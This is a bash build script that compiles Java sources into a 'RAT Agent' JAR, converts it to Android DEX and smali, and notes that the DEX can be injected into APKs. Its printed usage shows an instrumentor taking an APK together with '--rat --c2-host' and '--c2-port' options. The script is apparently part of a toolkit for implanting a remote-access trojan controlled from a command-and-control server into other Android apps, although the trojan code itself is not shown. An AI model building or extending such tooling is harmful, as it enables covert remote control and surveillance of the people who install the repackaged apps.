#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC_DIR="$SCRIPT_DIR/src"
BUILD_DIR="$SCRIPT_DIR/build"
SMALI_DIR="$SCRIPT_DIR/smali"
AGENT_JAR="$BUILD_DIR/agent.jar"
AGENT_DEX="$BUILD_DIR/classes.dex"

JAVA_HOME="${JAVA_HOME:-$(dirname $(dirname $(readlink -f $(which javac))))}"
ANDROID_HOME="${ANDROID_HOME:-$HOME/Android/Sdk}"

find_tool() {
    local name="$1"
    for candidate in \
        "$ANDROID_HOME/build-tools/$(ls "$ANDROID_HOME/build-tools/" 2>/dev/null | sort -V | tail -1)/$name" \
        "$ANDROID_HOME/build-tools/35.0.0/$name" \
        "$ANDROID_HOME/build-tools/34.0.0/$name" \
        "$ANDROID_HOME/build-tools/33.0.2/$name" \
        "$ANDROID_HOME/build-tools/30.0.3/$name" \
        "$(which $name 2>/dev/null)" \
        "$ANDROID_HOME/cmdline-tools/latest/bin/$name"; do
        if [ -f "$candidate" ] 2>/dev/null || [ -x "$candidate" ] 2>/dev/null; then
            echo "$candidate"
            return 0
        fi
    done
    return 1
}

D8=$(find_tool d8) || { echo "ERROR: d8 not found. Set ANDROID_HOME."; exit 1; }
BAKSMALI_JAR=""
for jar in \
    "$SCRIPT_DIR/baksmali.jar" \
    "$SCRIPT_DIR/tools/baksmali.jar" \
    "$HOME/.local/share/baksmali.jar" \
    "$(which baksmali 2>/dev/null)"; do
    if [ -f "$jar" ]; then BAKSMALI_JAR="$jar"; break; fi
done

echo "=== Building RAT Agent ==="
echo "JAVA_HOME: $JAVA_HOME"
echo "ANDROID_HOME: $ANDROID_HOME"
echo "D8: $D8"

rm -rf "$BUILD_DIR" "$SMALI_DIR"
mkdir -p "$BUILD_DIR/classes" "$SMALI_DIR"

echo "[1/4] Compiling Java sources..."
find "$SRC_DIR" -name "*.java" > "$BUILD_DIR/sources.txt"
"$JAVA_HOME/bin/javac" \
    -source 1.8 -target 1.8 \
    -bootclasspath "$ANDROID_HOME/platforms/android-30/android.jar" \
    -classpath "$ANDROID_HOME/platforms/android-30/android.jar" \
    -d "$BUILD_DIR/classes" \
    @"$BUILD_DIR/sources.txt"
echo "  Compiled $(wc -l < "$BUILD_DIR/sources.txt") files"

echo "[2/4] Creating JAR..."
cd "$BUILD_DIR/classes"
"$JAVA_HOME/bin/jar" cf "$AGENT_JAR" com/
cd "$SCRIPT_DIR"
echo "  Created $AGENT_JAR"

echo "[3/4] Converting to DEX..."
"$D8" \
    --lib "$ANDROID_HOME/platforms/android-30/android.jar" \
    --min-api 21 \
    --output "$BUILD_DIR" \
    "$AGENT_JAR"
echo "  Created $AGENT_DEX"

echo "[4/4] Converting DEX to smali..."
if [ -n "$BAKSMALI_JAR" ] && [ -f "$BAKSMALI_JAR" ]; then
    java -jar "$BAKSMALI_JAR" d "$AGENT_DEX" -o "$SMALI_DIR"
    SMALI_COUNT=$(find "$SMALI_DIR" -name "*.smali" | wc -l)
    echo "  Generated $SMALI_COUNT smali files"
else
    echo "  WARNING: baksmali.jar not found. Smali output skipped."
    echo "  Install baksmali: pip install baksmali or download baksmali.jar"
    echo "  The DEX file at $AGENT_DEX can still be injected directly."
fi

echo ""
echo "=== Build Complete ==="
echo "  JAR:  $AGENT_JAR"
echo "  DEX:  $AGENT_DEX"
echo "  Smali: $SMALI_DIR/"
echo ""
echo "Usage:"
echo "  python instrument.py <apk> --rat --c2-host <host> --c2-port <port>"
echo "  The instrumentor will use smali/ if available, otherwise inject DEX directly."
